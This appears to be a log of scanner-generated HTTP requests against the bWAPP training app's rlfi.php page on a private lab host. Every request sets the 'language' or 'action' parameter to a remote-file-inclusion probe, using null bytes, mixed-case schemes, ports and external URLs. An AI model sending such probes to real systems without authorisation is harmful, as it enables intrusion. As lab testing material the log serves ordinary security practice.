+GET /bWAPP/rlfi.php?language=%00HTTPS%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTPS%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTPS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTPS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTp%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTp%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTp%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTp%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTp%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTpS%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTpS%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTpS%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTpS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HtTpS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=http%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=http%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=www.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=www.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=www.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTP%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTP%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTP%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTP%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTP%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=https%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=https%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=https%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=https%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTPS%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTPS%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTPS%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
